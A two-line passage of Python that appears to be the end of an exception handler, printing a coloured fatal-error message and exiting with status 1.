        print(f"\n\033[1;91m[!] Fatal error occurred: {e}")
        sys.exit(1)
